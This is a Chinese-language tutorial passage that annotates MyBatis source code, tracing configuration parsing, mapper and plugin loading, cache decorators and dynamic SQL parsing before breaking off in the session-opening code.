// 创建一个XMLConfigBuilder，用于解析mybatis的全局配置文件            XMLConfigBuilder parser = new XMLConfigBuilder(reader, environment, properties);  \t\t    // 通过XMLConfigBuilder的parse方法进行解析      \t\t// 解析完成后得到一个Configuration对象，接着调用build方法            // 这里返回Configuration 再来个build()            return build(parser.parse());        &#125;..            finally &#123;                ...                    reader.close();            &#125;    &#125;        //第三步      // 到这里配置文件已经解析成了Configuration    public SqlSessionFactory build(Configuration config) &#123;        return new DefaultSqlSessionFactory(config);    &#125;&#125;\n\n这里主要就是解析Mybatis的配置文件到一个Configuration对象中，然后就返回一个SqlSessionFactory对象。\nXMLConfigBuilder//构造方法public XMLConfigBuilder(Reader reader, String environment, Properties props) &#123;    //调用自己的方法,new了一个XPathParser  XMLMapperEntityResolver    this(new XPathParser(reader, true, props, new XMLMapperEntityResolver()), environment, props);&#125;private XMLConfigBuilder(XPathParser parser, String environment, Properties props) &#123;    /**     * 调用父类的BaseBuilder的构造方法:给     * configuration赋值     * typeAliasRegistry别名注册器赋值     * TypeHandlerRegistry赋值     */    super(new Configuration());    ErrorContext.instance().resource(&quot;SQL Mapper Configuration&quot;);    /**     * 把props绑定到configuration的props属性上     */    this.configuration.setVariables(props);    this.parsed = false;    this.environment = environment;    this.parser = parser;&#125;public Configuration parse() &#123;    // 若已经解析过了 就抛出异常    if (parsed) &#123;        throw new BuilderException(&quot;Each XMLConfigBuilder can only be used once.&quot;);    &#125;        // 设置解析标志位    parsed = true;    /**     * 解析我们的mybatis-config.xml的     * 节点     * &lt;configuration&gt;     *     * &lt;/configuration&gt;     */    parseConfiguration(parser.evalNode(&quot;/configuration&quot;));    return configuration;&#125;// 解析全局配置文件// 传入的参数是&lt;configuration&gt;根节点，所有节点都会被XNode对象private void parseConfiguration(XNode root) &#123;   try &#123;     /**      * 解析&lt;properties&gt;节点      * 解析到Configuration的variables属性中      */     propertiesElement(root.evalNode(&quot;properties&quot;));            // 解析&lt;settings&gt;节点     Properties settings = settingsAsProperties(root.evalNode(&quot;settings&quot;));            /**      * 解析VFS基本没有用过该属性：      * VFS含义是虚拟文件系统，主要是通过程序能够方便读取本地文件系统、FTP文件系统等系统中的文件资源。      * Mybatis中提供了VFS这个配置，主要是通过该配置可以加载自定义的虚拟文件系统应用程序。      * 解析到Configuration的vfsImpl属性中      */     loadCustomVfs(settings);            /**      * 解析 MyBatis 所用日志的具体实现，未指定时将自动查找。      * SLF4J | LOG4J | LOG4J2 | JDK_LOGGING | COMMONS_LOGGING |        STDOUT_LOGGING | NO_LOGGING      * 解析到Configuration的logImpl属性中      */     loadCustomLogImpl(settings);            /**      * 解析别名      * 解析到Configuration的typeAliasRegistry.typeAliases属性中      */     typeAliasesElement(root.evalNode(&quot;typeAliases&quot;));            /**      * 解析插件(比如分页插件)      * mybatis自带的四个Executor、ParameterHandler、ResultSetHandler、StatementHandler       * 解析到Configuration的interceptorChain.interceptors属性中      */     pluginElement(root.evalNode(&quot;plugins&quot;));     // 解析对象工厂     objectFactoryElement(root.evalNode(&quot;objectFactory&quot;));     objectWrapperFactoryElement(root.evalNode(&quot;objectWrapperFactory&quot;));     reflectorFactoryElement(root.evalNode(&quot;reflectorFactory&quot;));     // 设置settings和默认值     // 这个方法里可以看到所有的settings选项和默认值     settingsElement(settings);                /**      * 解析mybatis环境environments      * 解析到Configuration的environment属性中      * 在集成spring情况下由spring-mybatis提供数据源和事务工厂      */     environmentsElement(root.evalNode(&quot;environments&quot;));            /**      * 解析数据库厂商databaseIdProvider      * 解析到Configuration的databaseId属性中      */     databaseIdProviderElement(root.evalNode(&quot;databaseIdProvider&quot;));            /**      * 解析类型处理器节点typeHandlers      * 解析到Configuration的typeHandlerRegistry.typeHandlerMap属性中      */     typeHandlerElement(root.evalNode(&quot;typeHandlers&quot;));            // 解析&lt;mappers&gt;节点，最重要     mapperElement(root.evalNode(&quot;mappers&quot;));   &#125; catch (Exception e) &#123;     throw new BuilderException(&quot;Error parsing SQL Mapper Configuration. Cause: &quot; + e, e);   &#125; &#125;\n\n解析的流程就是按照我们全局配置文件的结构来的，其中最重要的就是解析mappers节点下的sql映射文件\n解析插件插件的解析在parseConfiguration方法的pluginElement中：\n// 参数传入的时&lt;plugins&gt;标签封装的XNode节点// pluginElement(root.evalNode(&quot;plugins&quot;));private void pluginElement(XNode parent) throws Exception &#123;    if (parent != null) &#123;        //开始看子节点        /*         &lt;plugins&gt;        \t&lt;plugin interceptor=&quot;&quot;&gt;&lt;/plugin&gt;   \t\t &lt;/plugins&gt;        */        for (XNode child : parent.getChildren()) &#123;\t            String interceptor = child.getStringAttribute(&quot;interceptor&quot;);            Properties properties = child.getChildrenAsProperties();            // 将interceptor指定的类进行实例化，得到一个Interceptor拦截器对象            Interceptor interceptorInstance = (Interceptor) resolveClass(interceptor).getDeclaredConstructor().newInstance();            interceptorInstance.setProperties(properties);            // 将拦截器添加到configuration中            configuration.addInterceptor(interceptorInstance);        &#125;    &#125;&#125;\n\n插件的解析过程很简单，就是将其解析为拦截器Interceptor对象后存入Configuration中。\n解析Mapper映射文件映射文件的解析在XMLConfigBuilder类的mapperElement方法里\n// mapperElement(root.evalNode(&quot;mappers&quot;));private void mapperElement(XNode parent) throws Exception &#123;    if (parent != null) &#123;        /**       * 获取我们mappers节点下的一个一个的mapper节点       */        for (XNode child : parent.getChildren()) &#123;            /**         * 判断我们mapper是不是通过批量注册的         * &lt;package name=&quot;com.tuling.mapper&quot;&gt;&lt;/package&gt;         */            if (&quot;package&quot;.equals(child.getName())) &#123;                String mapperPackage = child.getStringAttribute(&quot;name&quot;);                configuration.addMappers(mapperPackage);            &#125; else &#123;               /**               * 判断从classpath下读取我们的mapper               * &lt;mapper resource=&quot;mybatis/mapper/EmployeeMapper.xml&quot;/&gt;               */                String resource = child.getStringAttribute(&quot;resource&quot;);               /**               * 判断是不是从我们的网络资源读取(或者本地磁盘得)               * &lt;mapper url=&quot;D:/mapper/EmployeeMapper.xml&quot;/&gt;               */                String url = child.getStringAttribute(&quot;url&quot;);               /**               * 解析这种类型(要求接口和xml在同一个包下)               * &lt;mapper class=&quot;com.tuling.mapper.DeptMapper&quot;&gt;&lt;/mapper&gt;               *               */                String mapperClass = child.getStringAttribute(&quot;class&quot;);               /**               * 我们得mappers节点只配置了               * &lt;mapper resource=&quot;mybatis/mapper/EmployeeMapper.xml&quot;/&gt;               */                if (resource != null &amp;&amp; url == null &amp;&amp; mapperClass == null) &#123;                    ErrorContext.instance().resource(resource);                    /**                     * 把我们的文件读取出一个流                     */                    InputStream inputStream = Resources.getResourceAsStream(resource);                    /**                     * 创建读取XmlMapper构建器对象,用于来解析我们的mapper.xml文件                     */                    XMLMapperBuilder mapperParser = new XMLMapperBuilder(inputStream, configuration, resource, configuration.getSqlFragments());                    /**                     * 真正的解析我们的mapper.xml配置文件(说白了就是来解析我们的sql)                     */                    mapperParser.parse();                &#125; else if (resource == null &amp;&amp; url != null &amp;&amp; mapperClass == null) &#123;                    ErrorContext.instance().resource(url);                    InputStream inputStream = Resources.getUrlAsStream(url);                    XMLMapperBuilder mapperParser = new XMLMapperBuilder(inputStream, configuration, url, configuration.getSqlFragments());                    mapperParser.parse();                &#125; else if (resource == null &amp;&amp; url == null &amp;&amp; mapperClass != null) &#123;                    Class&lt;?&gt; mapperInterface = Resources.classForName(mapperClass);                    configuration.addMapper(mapperInterface);                &#125; else &#123;                    throw new BuilderException(&quot;A mapper element may only specify a url, resource or class, but not more than one.&quot;);                &#125;            &#125;        &#125;    &#125;&#125;\n\n从这里我们可以看到Mapper的四种配置方式：\n1、&lt;package name=&quot;com.tuling.mapper&quot;&gt;&lt;/package&gt;   批量加载mapper 直接扫描包\n2、&lt;mapper resource=&quot;mybatis/mapper/EmployeeMapper.xml&quot;/&gt;  从classpath下读取我们的mapper\n3、&lt;mapper url=&quot;D:/mapper/EmployeeMapper.xml&quot;/&gt;        从我们的网络资源读取(或者本地磁盘得)\n4、&lt;mapper class=&quot;com.tuling.mapper.DeptMapper&quot;&gt;&lt;/mapper&gt;  解析这种类型(要求接口和xml在同一个包下)\n简述下，分别是批量加载，classpath路径下，URL获取，同位置包\n我们看到最后是调用XMLMapperBuilder.parse()方法\n它是解析的Mapper文件\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.tuling.mapper.UserMapper&quot;&gt;    &lt;cache &gt;&lt;/cache&gt;        &lt;!-- Mybatis 是如何将 sql 执行结果封装为目标对象并返回的？都有哪些映射形式？--&gt;    &lt;resultMap id=&quot;result&quot; type=&quot;com.tuling.entity.User&quot; &gt;        &lt;id column=&quot;id&quot; jdbcType=&quot;BIGINT&quot; property=&quot;id&quot; /&gt;        &lt;result column=&quot;user_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userName&quot; /&gt;        &lt;result column=&quot;create_time&quot; jdbcType=&quot;DATE&quot; property=&quot;createTime&quot; /&gt;    &lt;/resultMap&gt;    &lt;select id=&quot;selectById&quot;  resultMap=&quot;result&quot;     &gt;        select id,user_name,create_time from t_user where id=$&#123;param1&#125;        &lt;where&gt;            &lt;if test=&quot;param1&gt;0&quot;&gt;               and id=#&#123;param1&#125;            &lt;/if&gt;        &lt;/where&gt;    &lt;/select&gt;&lt;/mapper&gt;\n\n我们进入源码分析：\npublic void parse() &#123;    // 判断当前的Mapper是否被加载过    if (!configuration.isResourceLoaded(resource)) &#123;        // 通过configurationElement解析映射文件        // 传入根节点&lt;mapper&gt;封装成的XNode对象        configurationElement(parser.evalNode(&quot;/mapper&quot;));        // 把资源保存到Configuration对象中        configuration.addLoadedResource(resource);        bindMapperForNamespace();    &#125;    parsePendingResultMaps();    parsePendingCacheRefs();    parsePendingStatements();&#125;//解析对应mapper节点private void configurationElement(XNode context) &#123;    try &#123;        //解析我们的namespace属性        //&lt;mapper namespace=&quot;com.tuling.mapper.EmployeeMapper&quot;&gt;        String namespace = context.getStringAttribute(&quot;namespace&quot;);        if (namespace == null || namespace.equals(&quot;&quot;)) &#123;            throw new BuilderException(&quot;Mapper&#x27;s namespace cannot be empty&quot;);        &#125;        //保存我们当前的namespace  并且判断接口完全类名==namespace        builderAssistant.setCurrentNamespace(namespace);        /**        * 解析我们的缓存引用        * 说明我当前的缓存引用和DeptMapper的缓存引用一致        * &lt;cache-ref namespace=&quot;com.tuling.mapper.DeptMapper&quot;&gt;&lt;/cache-ref&gt;        解析到org.apache.ibatis.session.Configuration#cacheRefMap        &lt;当前namespace,ref-namespace&gt;        异常下（引用缓存未使用缓存）:        org.apache.ibatis.session.Configuration#incompleteCacheRefs        */        //解析缓存引用        cacheRefElement(context.evalNode(&quot;cache-ref&quot;));        /**        * 解析我们的cache节点        * &lt;cache type=&quot;org.mybatis.caches.ehcache.EhcacheCache&quot;&gt;&lt;/cache&gt;        解析到：org.apache.ibatis.session.Configuration#caches        org.apache.ibatis.builder.MapperBuilderAssistant#currentCache        */        //解析缓存        cacheElement(context.evalNode(&quot;cache&quot;));              /**        * 解析paramterMap节点(该节点mybaits3.5貌似不推荐使用了)        */        parameterMapElement(context.evalNodes(&quot;/mapper/parameterMap&quot;));                /**        * 解析我们的resultMap节点        * 解析到：org.apache.ibatis.session.Configuration#resultMaps        *    异常 org.apache.ibatis.session.Configuration#incompleteResultMaps        *        */        resultMapElements(context.evalNodes(&quot;/mapper/resultMap&quot;));                /**        * 解析我们通过sql节点        *  解析到org.apache.ibatis.builder.xml.XMLMapperBuilder#sqlFragments        *   其实等于 org.apache.ibatis.session.Configuration#sqlFragments        *   因为他们是同一引用，在构建XMLMapperBuilder 时把Configuration.getSqlFragments传进去了        */        sqlElement(context.evalNodes(&quot;/mapper/sql&quot;));                /**        * 解析我们的select | insert |update |delete节点        * 解析到org.apache.ibatis.session.Configuration#mappedStatements        */        // 猜测|在内部被认为是或语义        // 解析select等节点        buildStatementFromContext(context.evalNodes(&quot;select|insert|update|delete&quot;));            &#125; catch (Exception e) &#123;        throw new BuilderException(&quot;Error parsing Mapper XML. The XML location is &#x27;&quot; + resource + &quot;&#x27;. Cause: &quot; + e, e);    &#125;&#125;、\n\n我们关注一下两个方法：二级缓存和解析Sql\n解析二级缓存一级缓存是基于会话的，二级缓存是基于Mapper，或者说命名空间的\n//cacheElement(context.evalNode(&quot;cache&quot;));private void cacheElement(XNode context) &#123;  if (context != null) &#123;    // 解析cache节点的type属性    String type = context.getStringAttribute(&quot;type&quot;, &quot;PERPETUAL&quot;);    Class&lt;? extends Cache&gt; typeClass = typeAliasRegistry.resolveAlias(type);    // 获取缓存过期策略eviction属性,默认是LRU    String eviction = context.getStringAttribute(&quot;eviction&quot;, &quot;LRU&quot;);    Class&lt;? extends Cache&gt; evictionClass = typeAliasRegistry.resolveAlias(eviction);    // 获取刷新间隔flushInterval    // 属性可以被设置为任意的正整数，设置的值应该是一个以毫秒为单位的合理时间量    // 默认情况是不设置，也就是没有刷新间隔，缓存仅仅会在调用语句时刷新    Long flushInterval = context.getLongAttribute(&quot;flushInterval&quot;);    // 获取缓存数量size    // 属性可以被设置为任意正整数，要注意欲缓存对象的大小和运行环境中可用的内存资源，默认值是1024    Integer size = context.getIntAttribute(&quot;size&quot;);    // 获取只读readonly，默认为false    boolean readWrite = !context.getBooleanAttribute(&quot;readOnly&quot;, false);    boolean blocking = context.getBooleanAttribute(&quot;blocking&quot;, false);    Properties props = context.getChildrenAsProperties();    // 调用MapperBuilderAssistant的useNewCache方法    // 创建一个新的缓存，并且把存节点加入到Configuration中    builderAssistant.useNewCache(typeClass, evictionClass, flushInterval, size, readWrite, blocking, props);  &#125;&#125;  public Cache useNewCache(Class&lt;? extends Cache&gt; typeClass,      Class&lt;? extends Cache&gt; evictionClass,      Long flushInterval,      Integer size,      boolean readWrite,      boolean blocking,      Properties props) &#123;      // 通过CacheBuilder构建二级缓存Cache      // 又是生成器设计模式，分步骤创建复杂对象Cache    Cache cache = new CacheBuilder(currentNamespace)        .implementation(valueOrDefault(typeClass, PerpetualCache.class))        .addDecorator(valueOrDefault(evictionClass, LruCache.class))        .clearInterval(flushInterval)        .size(size)        .readWrite(readWrite)        .blocking(blocking)        .properties(props)        .build();//最后使用build生产chche    configuration.addCache(cache);//添加到configuration中    currentCache = cache;    return cache;  &#125;\n\n在构建二级缓存中使用了生成器设计模式和装饰器模式，作用分别是帮助构建复杂的对象，为类进行一些装饰【类似套娃。\npublic Cache build() &#123;    //构造方法比较困难，需要搞很多配置 一个简单的构造方法完成不了    //设置默认的缓存实现类    setDefaultImplementations();    Cache cache = newBaseCacheInstance(implementation, id);    //设置chche属性    setCacheProperties(cache);    // issue #352, do not apply decorators to custom caches    if (PerpetualCache.class.equals(cache.getClass())) &#123;        for (Class&lt;? extends Cache&gt; decorator : decorators) &#123;            // 实例化所有装饰类            // 这里会实例化LruCache类，装饰PerpetualCache            cache = newCacheDecoratorInstance(decorator, cache);            setCacheProperties(cache);        &#125;        //LRU配置        cache = setStandardDecorators(cache);    &#125; else if (!LoggingCache.class.isAssignableFrom(cache.getClass())) &#123;        cache = new LoggingCache(cache);    &#125;    return cache;&#125;//设置默认实现类private void setDefaultImplementations() &#123;    if (implementation == null) &#123;        //默认实现类为PerpetualCache        implementation = PerpetualCache.class;        if (decorators.isEmpty()) &#123;            //向装饰器数据中添加LRU            decorators.add(LruCache.class);        &#125;    &#125;&#125;//设置装饰器private Cache setStandardDecorators(Cache cache) &#123;    try &#123;        MetaObject metaCache = SystemMetaObject.forObject(cache);        if (size != null &amp;&amp; metaCache.hasSetter(&quot;size&quot;)) &#123;            metaCache.setValue(&quot;size&quot;, size);        &#125;        //设置缓存刷新间隔        if (clearInterval != null) &#123;            cache = new ScheduledCache(cache);            //ScheduledCache：调度缓存，负责定时清空缓存            ((ScheduledCache) cache).setClearInterval(clearInterval);        &#125;                if (readWrite) &#123;              //将LRU缓存 装饰到 Serialized缓存            //SerializedCache：缓存序列化和反序列化存储            cache = new SerializedCache(cache);         &#125;        // 装饰成LoggingCache        cache = new LoggingCache(cache);        // 装饰成SynchronizedCache        cache = new SynchronizedCache(cache);        if (blocking) &#123;            cache = new BlockingCache(cache);        &#125;        return cache;    &#125; catch (Exception e) &#123;        throw new CacheException(&quot;Error building standard cache decorators.  Cause: &quot; + e, e);    &#125;&#125;\n\n从上面看到，经过大量的装饰类，返回的是SynchronizedCache这个cache类。\n\n解析动态sql其在buildStatementFromContext(context.evalNodes(&quot;select|insert|update|delete&quot;));方法中\n是解析对应的select|insert|update|delete节点信息\n // 解析sql语句标签，传入映射文件中的所有Sql语句标签对应的XNode集合 private void buildStatementFromContext(List&lt;XNode&gt; list) &#123;   //判断是否有配置数据库厂商ID   if (configuration.getDatabaseId() != null) &#123;     buildStatementFromContext(list, configuration.getDatabaseId());   &#125;   buildStatementFromContext(list, null); &#125; private void buildStatementFromContext(List&lt;XNode&gt; list, String requiredDatabaseId) &#123;   //循环我们的select|delte|insert|update节点   for (XNode context : list) &#123;     //创建一个xmlStatement的构建器对象     final XMLStatementBuilder statementParser = new XMLStatementBuilder(configuration, builderAssistant, context, requiredDatabaseId);     try &#123;       //调用parseStatementNode()方法       statementParser.parseStatementNode();     &#125; catch (IncompleteElementException e) &#123;       configuration.addIncompleteStatement(statementParser);     &#125;   &#125; &#125; public void parseStatementNode() &#123;// 得到 insert|delte|update|select 标签的sqlId   String id = context.getStringAttribute(&quot;id&quot;);   //判断是否配置了数据库厂商   String databaseId = context.getStringAttribute(&quot;databaseId&quot;);   //匹配当前数据库厂商ID是否匹配当前数据源厂商id   //如果没有在insert等标签上设置id，那返回true   if (!databaseIdMatchesCurrent(id, databaseId, this.requiredDatabaseId)) &#123;     return;   &#125;        //获取节点名称select|insert|update|delete   String nodeName = context.getNode().getNodeName();        //根据nodeName 获得 SqlCommandType枚举   SqlCommandType sqlCommandType = SqlCommandType.valueOf(nodeName.toUpperCase(Locale.ENGLISH));        //判断是否为select节点   boolean isSelect = sqlCommandType == SqlCommandType.SELECT;        //获取flushCache属性   //默认值为isSelect的反值：查询：默认flushCache=false   增删改：默认flushCache=true   boolean flushCache = context.getBooleanAttribute(&quot;flushCache&quot;, !isSelect);        //判断是否使用缓存   //查询：默认useCache=true   增删改：默认useCache=false   boolean useCache = context.getBooleanAttribute(&quot;useCache&quot;, isSelect);   //resultOrdered:  是否需要处理嵌套查询结果 group by (使用极少）   //可以将比如 30条数据的三组数据  组成一个嵌套的查询结果   boolean resultOrdered = context.getBooleanAttribute(&quot;resultOrdered&quot;, false);   /**    * 解析我们的sql公用片段    *     &lt;select id=&quot;qryEmployeeById&quot; resultType=&quot;Employee&quot; parameterType=&quot;int&quot;&gt;             &lt;include refid=&quot;selectInfo&quot;&gt;&lt;/include&gt;             employee where id=#&#123;id&#125;          &lt;/select&gt;       将 &lt;include refid=&quot;selectInfo&quot;&gt;&lt;/include&gt; 解析成sql语句        放在&lt;select&gt;Node的子节点中    */   // 解析重用的sql片段，就是通过&lt;sql&gt;标签设置的   // 就是将&lt;include/&gt;标签指定的语句解析成sql语句   XMLIncludeTransformer includeParser = new XMLIncludeTransformer(configuration, builderAssistant);   includeParser.applyIncludes(context.getNode());   // 解析Sql语句标签的参数类型parameterType   String parameterType = context.getStringAttribute(&quot;parameterType&quot;);   // 把参数类型字符串转化为class   Class&lt;?&gt; parameterTypeClass = resolveClass(parameterType);   // 获取lang属性，查看sql是否支撑自定义语言   String lang = context.getStringAttribute(&quot;lang&quot;);   // 获取自定义sql脚本语言驱动，默认为XMLLanguageDriver   LanguageDriver langDriver = getLanguageDriver(lang);   // 解析&lt;insert&gt;语句中的&lt;selectKey&gt;节点   // 可以返回插入数据的id值，可用于实现oracle数据库的自增   processSelectKeyNodes(id, parameterTypeClass, langDriver);   // Parse the SQL (pre: &lt;selectKey&gt; and &lt;include&gt; were parsed and removed)   // 主键生成器   KeyGenerator keyGenerator;   // 得到sqlID拼接上!selectKey字符串   // 比如：selectById!selectKey   String keyStatementId = id + SelectKeyGenerator.SELECT_KEY_SUFFIX;   // 命名空间拼接到keyStatementId中   // 比如：com.jimmy.mapper.UserMapper.selectById!selectKey   keyStatementId = builderAssistant.applyCurrentNamespace(keyStatementId, true);   /**    *&lt;insert id=&quot;saveEmployee&quot; parameterType=&quot;com.tuling.entity.Employee&quot; useGeneratedKeys=&quot;true&quot; keyProperty=&quot;id&quot;&gt;    *判断我们全局的配置类configuration中是否包含以及解析过的组件生成器对象    */   //  判断我们全局的配置类configuration中是否包含以及解析过的主键生成器对象   if (configuration.hasKeyGenerator(keyStatementId)) &#123;     keyGenerator = configuration.getKeyGenerator(keyStatementId);   &#125; else &#123;     /**      * 若我们配置了useGeneratedKeys 那么就去除useGeneratedKeys的配置值,      * 否者就看我们的mybatis-config.xml配置文件中是配置了      * &lt;setting name=&quot;useGeneratedKeys&quot; value=&quot;true&quot;&gt;&lt;/setting&gt; 默认是false      * 并且判断sql操作类型是否为insert      * 若是的话,那么使用的生成策略就是Jdbc3KeyGenerator.INSTANCE      * 否则就是NoKeyGenerator.INSTANCE      */     keyGenerator = context.getBooleanAttribute(&quot;useGeneratedKeys&quot;,         configuration.isUseGeneratedKeys() &amp;&amp; SqlCommandType.INSERT.equals(sqlCommandType))         ? Jdbc3KeyGenerator.INSTANCE : NoKeyGenerator.INSTANCE;   &#125;/**    * 通过class org.apache.ibatis.scripting.xmltags.XMLLanguageDriver来解析我们的    * sql脚本对象--解析SqlNode.     * 注意，只是解析成一个个的SqlNode，并不会完全解析sql,因为这个时候参数都没确定，动态sql无法解析    */   // 通过XMLLanguageDriver来解析Sql语句标签，这里将Sql语句标签解析成一个个的SqlNode   // 解析后封装，返回一个SqlSource对象   SqlSource sqlSource = langDriver.createSqlSource(configuration, context, parameterTypeClass);   /**    * 获取statementType属性值，它用于指定mybatis使用的statement类型    * STATEMENT：Statement - 普通sql    * PREPARED：PreparedStatement(默认) - 支持可变参数    * CALLABLE：CallableStatement - 用于调用存储过程    */   StatementType statementType = StatementType.valueOf(context.getStringAttribute(&quot;statementType&quot;, StatementType.PREPARED.toString()));   /**    * 获取fetchSize属性的值    * 这是一个给驱动的提示，尝试让驱动程序每次批量返回的结果行数和这个设置值相等      * 很少会用到，默认值为未设置（unset）（依赖驱动）    */   Integer fetchSize = context.getIntAttribute(&quot;fetchSize&quot;);   /**    * 获取timeout属性的值    * 这个设置是在抛出异常之前，驱动程序等待数据库返回请求结果的秒数    * 默认值为未设置（unset）（依赖驱动）。    */   Integer timeout = context.getIntAttribute(&quot;timeout&quot;);   // 获取parameterMap属性的值，默认为未设置   String parameterMap = context.getStringAttribute(&quot;parameterMap&quot;);   // 获取resultType属性的值，用于指定执行结果类型    // 注意如果返回的是集合，那应该设置为集合包含的类型，而不是集合本身。   // 可以使用 resultType 或 resultMap，但不能同时使用   String resultType = context.getStringAttribute(&quot;resultType&quot;);   // 解析resultType的类型   Class&lt;?&gt; resultTypeClass = resolveClass(resultType);、   // 解析resultMap，结果集映射   String resultMap = context.getStringAttribute(&quot;resultMap&quot;);   String resultSetType = context.getStringAttribute(&quot;resultSetType&quot;);   ResultSetType resultSetTypeEnum = resolveResultSetType(resultSetType);   if (resultSetTypeEnum == null) &#123;     resultSetTypeEnum = configuration.getDefaultResultSetType();   &#125;   // 解析keyProperty和keyColumn属性，仅适用于insert和update语句   String keyProperty = context.getStringAttribute(&quot;keyProperty&quot;);   String keyColumn = context.getStringAttribute(&quot;keyColumn&quot;);   String resultSets = context.getStringAttribute(&quot;resultSets&quot;);   // 最后通过MapperBuilderAssistant的addMappedStatement方法   // 将insert|delete|update|select节点构建成mappedStatment对象   builderAssistant.addMappedStatement(id, sqlSource, statementType, sqlCommandType,       fetchSize, timeout, parameterMap, parameterTypeClass, resultMap, resultTypeClass,       resultSetTypeEnum, flushCache, useCache, resultOrdered,       keyGenerator, keyProperty, keyColumn, databaseId, langDriver, resultSets); &#125;\n浏览完上述的代码，我们着重去看如何把sql语句解析成SqlSource对象：\nSqlSource sqlSource =     langDriver.createSqlSource(configuration, context, parameterTypeClass);\n\n我们去看对应的XMLLanguageDriver的createSqlSource方法：\n /**  * 方法实现说明:创建我们的sqlSource对象  * @author:xsls  * @param configuration:全局配置  * @param script:脚本类型  * @param parameterType:参数类型  * @return:  * @exception:  * @date:2019/9/6 16:10  */ @Override public SqlSource createSqlSource(Configuration configuration, XNode script, Class&lt;?&gt; parameterType) &#123;   XMLScriptBuilder builder = new XMLScriptBuilder(configuration, script, parameterType);     //使用XMLScriptBuilder的parseScriptNode()   return builder.parseScriptNode(); &#125; public SqlSource parseScriptNode() &#123;   /**    * 这里会将sql标签解析成一个SqlSource对象，如果是动态Sql就对应DynamicSqlSource。    * SqlSource中的成员变量rootSqlNode就是sql解析出来的的根节点。    * 比如我们映射配置文件案例中的sql就是动态sql，通过【递归】的方式会被解析为若干个SqlNode节点：    * - MixedSqlNode对应&lt;SELECT&gt;（根节点）    *   - StaticTextSqlNode对应Sql语句（二级节点）    *   - WhereSqlNode对应&lt;WHERE&gt;（二级节点）    *     - IfSqlNode对应&lt;IF&gt;（三级节点）    *       - StaticTextSqlNode对应Sql语句（四级节点）    */   MixedSqlNode rootSqlNode = parseDynamicTags(context);   SqlSource sqlSource;   //判断是否为动态SQL   if (isDynamic) &#123;     // 动态Sql源     // 把刚刚的MixedSqlNode变为DynamicSqlSource，下面类似\t     sqlSource = new DynamicSqlSource(configuration, rootSqlNode);   &#125; else &#123;     // 静态Sql源， 它会在这里解析     sqlSource = new RawSqlSource(configuration, rootSqlNode, parameterType);   &#125;   return sqlSource; &#125; // 解析标签 protected MixedSqlNode parseDynamicTags(XNode node) &#123;   List&lt;SqlNode&gt; contents = new ArrayList&lt;&gt;();   // 获得Sql语句标签(比如&lt;SELECT&gt;)的子节点     NodeList children = node.getNode().getChildNodes();     // 遍历子节点   for (int i = 0; i &lt; children.getLength(); i++) &#123;     XNode child = node.newXNode(children.item(i));     // 如果是文本节点，比如sql语句和空行都是文本节点     if (child.getNode().getNodeType() == Node.CDATA_SECTION_NODE || child.getNode().getNodeType() == Node.TEXT_NODE) &#123;       // 获得sql文本         String data = child.getStringBody(&quot;&quot;);        // 将sql文本封装为TextSqlNode       TextSqlNode textSqlNode = new TextSqlNode(data);       // 如果sql文本中有$&#123;&#125;，就是算Dynamic       if (textSqlNode.isDynamic()) &#123;          contents.add(textSqlNode);         //这里设定为动态SQL         isDynamic = true;       &#125; else &#123;         contents.add(new StaticTextSqlNode(data));       &#125;     // 如果不是文本节点，比如&lt;where&gt;&lt;if&gt;&lt;trim&gt;等动态节点     &#125; else if (child.getNode().getNodeType() == Node.ELEMENT_NODE) &#123; // issue #628       String nodeName = child.getNode().getNodeName();       // 拿到一个NodeHandler节点处理器       NodeHandler handler = nodeHandlerMap.get(nodeName);       if (handler == null) &#123;         throw new BuilderException(&quot;Unknown element &lt;&quot; + nodeName + &quot;&gt; in SQL statement.&quot;);       &#125;       // 通过节点处理器解析动态节点，不同的节点有不同的处理器       // 比如：WhereHandler、IfHandler、TrimHandler等等       // 这里会进行【递归】解析，将所有的节点都解析出来       handler.handleNode(child, contents);        // 如果有这种动态节点，那说明是动态sql       isDynamic = true;     &#125;   &#125;   return new MixedSqlNode(contents); &#125; private class WhereHandler implements NodeHandler &#123;   public WhereHandler() &#123;     // Prevent Synthetic Access   &#125;//handler.handleNode(child, contents);   //这里调用这个完成解析where   @Override   public void handleNode(XNode nodeToHandle, List&lt;SqlNode&gt; targetContents) &#123;     //又是解析标签的调用     //如果又遇到非文本节点 就继续递归     MixedSqlNode mixedSqlNode = parseDynamicTags(nodeToHandle);     WhereSqlNode where = new WhereSqlNode(configuration, mixedSqlNode);     targetContents.add(where);   &#125; &#125;\n\n到这里Sql语句标签就解析完成了，我们简单总结一下Sql语句的解析过程：\n\n通过XMLStatementBuilder类的parseStatementNode方法解析Sql语句标签，包含若干属性和Sql语句。\n通过XMLScriptBuilder类的parseScriptNode方法，通过递归的方式将Sql语句解析成若干个SqlNode节点，并且封装至SqlSource对象中。\n最后将所有属性和Sql语句对应的SqlSource对象封装成MappedStatement对象，保存至Configuration的一个Map中，key就是Sql语句所属方法的全限定名。\n\nSQL执行流程我们使用生成器模式完成了SqlSessionFactory的构建，现在我们可以看后续的操作：\nSqlSession session = sqlMapper.openSession();try &#123;    // 执行查询 底层执行jdbc    User user = (User)session.selectOne(&quot;com.tuling.mapper.UserMapper.selectById&quot;, 1);    /*UserMapper mapper = session.getMapper(UserMapper.class);                System.out.println(mapper.getClass());                User user = mapper.selectById(1L);*/    session.commit();    System.out.println(user.getUserName());&#125;\n\n跟进到到SqlSessionFactory的实现类DefaultSqlSessionFactory的openSession方法中：\n@Overridepublic SqlSession openSession() &#123;    return openSessionFromDataSource(configuration.getDefaultExecutorType(), null, false);&#125; /**   * 方法实现说明:从session中开启一个数据源   * @author:xsls   * @param execType:执行器类型   * @param level:隔离级别   * @return:SqlSession   * @exception:   * @date:2019/9/9 13:38   */  private SqlSession openSessionFromDataSource(ExecutorType execType, TransactionIsolationLevel level, boolean autoCommit) &#123;    Transaction tx = null;    try &#123;      // 获取环境变量      final Environment environment = configuration.getEnvironment();      // 获取事务工厂      final TransactionFactory transactionFactory = getTransactionFactoryFromEnvironment(environment);      tx = transactionFactory.newTransaction(environment.getDataSource(), level, autoCommit);      /**       * 创建一个sql执行器【Executor对象】，这是一个核心对象       * 一般情况下若的mybaits的全局配置文件的cacheEnabled为ture（开启二级缓存）       * 就返回一个CachingExecutor,若关闭的话返回的就是一个SimpleExecutor       